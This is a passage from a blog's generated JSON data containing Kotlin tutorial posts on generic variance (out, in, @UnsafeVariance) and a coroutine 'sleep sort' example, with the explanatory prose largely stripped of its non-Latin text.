 <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//  </span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// </span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>Data&lt;Student&gt;Data&lt;Person&gt;</p>\n<p></p>\n<p><strong></strong> ()</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> Transformer<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> T<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> trans <span class=\"token operator\">=</span> <span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> Person<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> t<span class=\"token punctuation\">.</span>name\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token punctuation\">)</span> <span class=\"token comment\">//  </span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Student<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> student <span class=\"token operator\">=</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Tom\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> trans<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>student<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"UnsafeVariance\"><a href=\"#UnsafeVariance\" class=\"headerlink\" title=\"@UnsafeVariance\"></a>@UnsafeVariance</h2><p>/</p>\n<p><strong></strong></p>\n<p></p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// @UnsafeVariance</span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// @UnsafeVariance</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n</b>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Kotlin--x2F-\"><a href=\"#Kotlin--x2F-\" class=\"headerlink\" title=\"Kotlin &#x2F;\"></a>Kotlin &#x2F;</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>: StudentPerson</p>\n<p>Data&lt;T&gt;(val data: T)</p>\n<p>testData&lt;Person&gt;,Data&lt;Student&gt;</p>\n<p>test</p>\n<p>Data&lt;Student&gt;Data&lt;Person&gt;</p>\n<p>List</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// </span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// </span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>List</p>\n<p>Java StudentPersonSimpleDataSimpleData </p>\n<p>crossinlineT)</p>\n<p>: </p>\n<blockquote>\n<p>MyClassA BMyClass<A>MyClass<B>MyClassT</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>out</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// out</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//  </span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// </span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>Data&lt;Student&gt;Data&lt;Person&gt;</p>\n<p></p>\n<p><strong></strong> ()</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> Transformer<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> T<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> trans <span class=\"token operator\">=</span> <span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> Person<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> t<span class=\"token punctuation\">.</span>name\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token punctuation\">)</span> <span class=\"token comment\">//  </span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Student<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> student <span class=\"token operator\">=</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Tom\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> trans<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>student<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"UnsafeVariance\"><a href=\"#UnsafeVariance\" class=\"headerlink\" title=\"@UnsafeVariance\"></a>@UnsafeVariance</h2><p>&#x2F;</p>\n<p><strong></strong></p>\n<p></p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// @UnsafeVariance</span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// @UnsafeVariance</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n"},{"title":"kotlin","date":"2021-10-18T03:45:28.000Z","author":"","hide":false,"summary":"Kotlin","_content":"\n# kotlin\n\n```kotlin\n//  kotlin\n// \n// kt\nfun sleepSort(array: Array<Int?>): List<Int?> {\n    val result = arrayListOf<Int>()\n    val list = arrayListOf<Deferred<Unit>>()\n    for (i in array) {\n        list.add(GlobalScope.async {\n            delay(i!! * 10L)\n            result.add(i)\n            Unit\n        })\n    }\n    // \n    runBlocking {\n        list.forEach {\n            it.await()\n        }\n    }\n    return result\n}\n```\n\n","source":"_posts/kotlin-sleep-sort.md","raw":"---\ntitle: kotlin\ndate: 2021-10-18 11:45:28\nauthor: \nhide: false\nsummary: Kotlin\ncategories: \ntags:\n  - Kotlin\n  - Coroutine\n  - \n---\n\n# kotlin\n\n```kotlin\n//  kotlin\n// \n// kt\nfun sleepSort(array: Array<Int?>): List<Int?> {\n    val result = arrayListOf<Int>()\n    val list = arrayListOf<Deferred<Unit>>()\n    for (i in array) {\n        list.add(GlobalScope.async {\n            delay(i!! * 10L)\n            result.add(i)\n            Unit\n        })\n    }\n    // \n    runBlocking {\n        list.forEach {\n            it.await()\n        }\n    }\n    return result\n}\n```\n\n","slug":"kotlin-sleep-sort","published":1,"updated":"2021-11-19T09:36:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtp001wsfkl246n0xu0","content":"<h1 id=\"kotlin\"><a href=\"#kotlin\" class=\"headerlink\" title=\"kotlin\"></a>kotlin</h1><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">//  kotlin</span>\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// kt</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">sleepSort</span><span class=\"token punctuation\">(</span>array<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Deferred<span class=\"token operator\">&lt;</span>Unit<span class=\"token operator\">&gt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token keyword\">in</span> array<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>GlobalScope<span class=\"token punctuation\">.</span><span class=\"token function\">async</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">delay</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">!!</span> <span class=\"token operator\">*</span> <span class=\"token number\">10L</span><span class=\"token punctuation\">)</span>\n            result<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n            Unit\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">// </span>\n    runBlocking <span class=\"token punctuation\">{</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> result\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"kotlin\"><a href=\"#kotlin\" class=\"headerlink\" title=\"kotlin\"></a>kotlin</h1><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">//  kotlin</span>\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// kt</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">sleepSort</span><span class=\"token punctuation\">(</span>array<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Deferred<span class=\"token operator\">&lt;</span>Unit<span class=\"token operator\">></span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token keyword\">in</span> array<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>GlobalScope<span class=\"token punctuation\">.</span><span class=\"token function\">async</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">delay</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">!!</span> <span class=\"token operator\">*</span> <span class=\"token number\">10L</span><span class=\"token 